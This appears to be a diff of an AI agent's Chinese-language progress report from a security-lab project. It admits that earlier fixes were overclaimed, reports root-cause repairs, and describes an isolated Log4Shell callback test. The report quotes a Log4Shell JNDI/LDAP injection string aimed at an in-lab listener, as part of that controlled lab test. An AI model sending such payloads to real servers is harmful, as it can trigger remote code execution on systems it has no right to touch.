@@ -69,3 +69,29 @@
 - **R8（證據可稽核性）**：每個 check 的 evidence 指向報告自身。建議另存每次探測的原始指令／exit code／stdout／時間到 `validation-runs/<scenario>/<run>/`。屬較大改動，未動。
 - **R10（含 VM 計畫）**：`os_identity` 不在 schema enum → 會丟 RuntimeError；有 VM 主機時整個 compose ps 被跳過致容器假 FAIL。需與 infra-eng／contracts 協調（schema 屬共用契約），未自行改。
 - **R11**：schema 狀態列舉無 BLOCKED、無動作層級教學替代標記。需改 `packages/contracts`（共用），回報 Lead。
+
+## 更正（回應 reviewer REQUEST_CHANGES，agent/poc-eng@4c1b484）
+
+reviewer 指出里程碑 2 對 R3、R6 的「已修」宣稱在**真實 Docker 流程**上不成立（我當時只用單元 mock 驗證）。更正如下，並已修根因：
+
+- **R3 更正**：里程碑 2 寫「a2/a3/a4 現改為 NOT_TESTED」在真實 planner 產出下**不正確**。真實 planner（`planner/topology.py:227`）把一條連線的 reason 寫成 `Scenario action(s) a1, a2, a3, a4 require access to ...`，且該情境所有動作 `target_host_ref` 皆為 None，故僅靠「id 出現在 reason」會全部命中 → 仍全 PARTIAL。reviewer 的真實跑即為 a1–a4 全 PARTIAL。
+- **R6 更正**：里程碑 2 的 R6 只改了判定函式，真實部署仍假 PASS。根因在 `manager.container_ipv4` 取到共用 `edge` 網路 IP，使同網路關閉埠被判為 unreachable→PASS。此根因屬 infra-eng。
+
+## 里程碑 3：隔離網路內的行為驗收測試（Log4Shell JNDI/LDAP 回呼，expected.md B2）
+
+位置：`tests/e2e/log4shell-callback/`（compose.yml＋app/listener.py＋app/victim.py＋run.py，皆我所有權）。
+- 安全性（由 compose 強制，非假設）：`labnet` 為 `internal: true`（無對外路由，實測 attacker 連 8.8.8.8/1.1.1.1 皆失敗）；攻擊動作只由 attacker 容器發出；目標僅實驗內 victim；回呼只落在實驗內無害 listener（只記錄、不回傳任何 payload／class，無 RCE）；全部用專案既有 pinned base image，無新增外拉；非 root、read-only、no-new-privileges。
+- 結果（證據 `reports/overnight/evidence/poc-eng/log4shell-callback-result.json`）：良性請求→無回呼；注入 `${jndi:ldap://listener:1389/...}`→victim 對 listener 發出一次真實 TCP 回呼（listener 記錄 peer_ip 與 bytes），`callback_behavior=PASS`；指向非實驗主機→被 allow-list 擋下且無回呼，`offlab_guard=PASS`。
+- **誠實分級**：僅真實重現 B2 的「可觀測回呼行為」。victim 為 ASSUMED·SUBSTITUTED 無害替身（非真實 Log4j／Horizon）；B1（真實 RCE）與 Windows 專屬步驟（B3/B10/B13/B17）**未重現**。與 cti-research expected.md 第 7 節一致（B2＝真實重現，B1＝教學替代）。
+
+## 里程碑 4：修 P1、P2（真實部署驗證）
+
+- **P1（R3）根因已修**：`_explicit_action_refs` 現要求「id 出現在 reason」**且**「動作 `target_host_ref` 等於該連線目標主機」；無 target 的動作一律無法對應 → NOT_TESTED。新增測試 `test_real_planner_reason_with_targetless_actions_is_not_tested`（用 planner 真實 reason 格式）與 `test_explicit_mapping_requires_matching_target_host`。
+  - 真實 Docker 重現：`reports/overnight/evidence/poc-eng/real-run-after-P1.json` → action-a1..a4 全 **NOT_TESTED**（修前 reviewer 跑為全 PARTIAL）。
+- **P2（R6）根因在 infra-eng，已協同修**：infra-eng 於 `agent/infra-eng@5059c10` 讓 `container_ipv4(sid, target, from_service=source)` 回傳來源與目標共用網路上的 IP。我已 `git merge agent/infra-eng` 進本分支並把驗證器 segmentation 探測改用 `from_service=source`。
+  - 真實 Docker 重現：`reports/overnight/evidence/poc-eng/real-run-after-P2.json` → segmentation-1（attacker→web2:8080，真正跨網路）= **PASS**（unreachable）；segmentation-2（attacker→web:9999，同網路關閉埠）= **NOT_TESTED**（ConnectionRefused）。修前為假 PASS。
+  - 新增真實部署回歸測試 `tests/e2e/test_segmentation_real.py`（實跑 42s 通過；Docker 不可用或埠衝突則 skip 不誤判）。
+- **注意（給 Lead）**：本分支現含 infra-eng 的合併（為了讓依賴 `from_service` 的驗證器與測試能跑）。整合進 main 時兩者需一起。
+- P3（無 actions 分支細節）、P4（顯示用 action_ref 寬鬆比對）、R2/R4（前端標示）仍為低優先，未在此輪處理。
+
+測試：`PYTHONPATH=apps/api /home/tyc4d/cr-project/.venv/bin/python -m pytest apps/api tests -q` → **78 passed, 3 subtests passed**（含 infra-eng 合併後測試與本輪新增）。
